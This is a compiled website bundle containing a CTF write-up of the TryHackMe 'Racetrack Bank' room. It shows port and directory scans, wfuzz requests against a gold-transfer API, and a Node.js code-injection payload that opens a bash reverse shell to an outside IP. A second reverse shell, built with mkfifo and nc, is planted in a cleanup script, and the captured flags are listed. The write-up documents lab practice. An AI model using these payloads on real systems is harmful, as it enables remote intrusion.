"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[9449],{3905:(e,t,n)=>{n.d(t,{Zo:()=>s,kt:()=>d});var r=n(67294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function c(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var l=r.createContext({}),p=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):c(c({},t),e)),n},s=function(e){var t=p(e.components);return r.createElement(l.Provider,{value:t},e.children)},u="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},k=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,l=e.parentName,s=i(e,["components","mdxType","originalType","parentName"]),u=p(n),k=a,d=u["".concat(l,".").concat(k)]||u[k]||m[k]||o;return n?r.createElement(d,c(c({ref:t},s),{},{components:n})):r.createElement(d,c({ref:t},s))}));function d(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,c=new Array(o);c[0]=k;var i={};for(var l in t)hasOwnProperty.call(t,l)&&(i[l]=t[l]);i.originalType=e,i[u]="string"==typeof e?e:a,c[1]=i;for(var p=2;p<o;p++)c[p]=n[p];return r.createElement.apply(null,c)}return r.createElement.apply(null,n)}k.displayName="MDXCreateElement"},34761:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>c,default:()=>m,frontMatter:()=>o,metadata:()=>i,toc:()=>p});var r=n(87462),a=(n(67294),n(3905));const o={},c="Racetrack Bank",i={unversionedId:"Tryhackme/Racetrack Bank/Racetrack Bank",id:"Tryhackme/Racetrack Bank/Racetrack Bank",title:"Racetrack Bank",description:"It's time for another heist.",source:"@site/writeups/Tryhackme/Racetrack Bank/Racetrack Bank.md",sourceDirName:"Tryhackme/Racetrack Bank",slug:"/Tryhackme/Racetrack Bank/",permalink:"/writeups/Tryhackme/Racetrack Bank/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Ra 2",permalink:"/writeups/Tryhackme/Ra 2/"},next:{title:"Recovery",permalink:"/writeups/Tryhackme/Recovery/"}},l={},p=[{value:"Task 1 Flags",id:"task-1-flags",level:2}],s={toc:p},u="wrapper";function m(e){let{components:t,...n}=e;return(0,a.kt)(u,(0,r.Z)({},s,n,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"racetrack-bank"},"Racetrack Bank"),(0,a.kt)("p",null,"It's time for another heist."),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/racetrackbank"},"Racetrack Bank")),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Code Injection"),(0,a.kt)("li",{parentName:"ul"},"Abusing SUID/GUID")),(0,a.kt)("hr",null),(0,a.kt)("h2",{id:"task-1-flags"},"Task 1 Flags"),(0,a.kt)("p",null,"Hack into the machine and capture both the user and root flags! It's pretty hard, so good luck."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Racetrack Bank$ sudo nmap -A -sS -sC -sV -O 10.10.44.102\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-20 15:58 CEST\nNmap scan report for 10.10.44.102\nHost is up (0.034s latency).\nNot shown: 998 filtered ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 51:91:53:a5:af:1a:5a:78:67:62:ae:d6:37:a0:8e:33 (RSA)\n|   256 c1:70:72:cc:82:c3:f3:3e:5e:0a:6a:05:4e:f0:4c:3c (ECDSA)\n|_  256 a2:ea:53:7c:e1:d7:60:bc:d3:92:08:a9:9d:20:6b:7d (ED25519)\n80/tcp open  http    nginx 1.14.0 (Ubuntu)\n|_http-server-header: nginx/1.14.0 (Ubuntu)\n|_http-title: Racetrack Bank\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%), Linux 2.6.32 - 3.1 (86%), Linux 2.6.39 - 3.2 (86%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 22/tcp)\nHOP RTT      ADDRESS\n1   33.95 ms 10.8.0.1\n2   34.09 ms 10.10.44.102\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 21.17 seconds\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Racetrack Bank$ gobuster dir -u http://10.10.44.102/ -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.44.102/\n[+] Threads:        25\n[+] Wordlist:       /usr/share/wordlists/dirb/common.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     txt,php,html\n[+] Timeout:        10s\n===============================================================\n2020/10/20 16:00:27 Starting gobuster\n===============================================================\n/create.html (Status: 200)\n/home.html (Status: 302)\n/Home.html (Status: 302)\n/images (Status: 301)\n/Images (Status: 301)\n/index.html (Status: 200)\n/Index.html (Status: 200)\n/index.html (Status: 200)\n/login.html (Status: 200)\n/Login.html (Status: 200)\n/purchase.html (Status: 302)\n===============================================================\n2020/10/20 16:01:01 Finished\n===============================================================\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://10.10.44.102/home.html"},"http://10.10.44.102/home.html")),(0,a.kt)("p",null,"wfuzz -w gold.txt -u ",(0,a.kt)("a",{parentName:"p",href:"http://10.10.44.102/api/givegold"},"http://10.10.44.102/api/givegold"),' -H "Content-Type: application/x-www-form-urlencoded" -b "connect.sid=s%3A1_QrOdmwhf3pJserjzFqbCWZAqIYR8fv.vb7X%2BTckrABMYXkszRkdjHm59MnUjLGo9jPnfbBaCc0" -d "user=test2&amount=FUZZ"'),(0,a.kt)("p",null,"wfuzz -w gold.txt -u ",(0,a.kt)("a",{parentName:"p",href:"http://10.10.44.102/api/givegold"},"http://10.10.44.102/api/givegold"),' -H "Content-Type: application/x-www-form-urlencoded" -b "connect.sid=s%3AdztpeWIe47gRM3QkNL6s1zBf_NqHY9eb.DErxWEyXCczE%2BYifpQ2t%2F7rMBpsh1AHZpTk73Z9yj6M" -d "user=test&amount=FUZZ"'),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://10.10.44.102/premiumfeatures.html?ans=2"},"http://10.10.44.102/premiumfeatures.html?ans=2")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"calculation=require('child_process').exec('bash+-c+\"bash+-i+>%26+/dev/tcp/10.8.106.222/9001+0>%261\"')")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"brian@racetrack:~/website$ cd ~\ncd ~\nbrian@racetrack:~$ ls -l\nls -l\ntotal 16\ndrwxrwxr-x 3 root  root  4096 Apr 23 05:07 admin\ndrwxr-xr-x 2 brian brian 4096 Apr 23 04:55 cleanup\n-rw-rw-r-- 1 brian brian   39 Apr 23 05:45 user.txt\ndrwxrwxr-x 6 brian brian 4096 Apr 22 09:41 website\nbrian@racetrack:~$ cat user.txt\ncat user.txt\nTHM{178c31090a7e0f69560730ad21d90e70}\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.106.222 9002 >/tmp/f' > cleanup/cleanupscript.sh\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"brian@racetrack:~$ find / -perm -4000 -user root -type f 2> /dev/null\nfind / -perm -4000 -user root -type f 2> /dev/null\n/home/brian/admin/manageaccounts\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"brian@racetrack:~$ cat root_flag.txt\ncat root_flag.txt\nTHM{55a9d6099933f6c456ccb2711b8766e3}\n")),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"User flag")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"THM{178c31090a7e0f69560730ad21d90e70}")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"Root flag")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"THM{55a9d6099933f6c456ccb2711b8766e3}")))}m.isMDXComponent=!0}}]);